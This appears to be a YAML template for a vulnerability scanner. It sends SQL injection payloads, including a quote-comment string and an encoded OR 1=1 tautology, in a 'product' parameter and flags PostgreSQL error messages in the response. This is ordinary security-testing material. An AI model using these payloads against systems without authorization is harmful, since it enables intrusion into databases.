id: sqli6-pg-18
name: 'SQLi pg probe in product'
severity: high
type: active
tags:
  - sqli
  - injection
  - pg
description: 'Triggers pg error via product'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      product:
        - 'admin"--'
        - '''%09OR%091=1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'PostgreSQL'
          - 'pg_query'
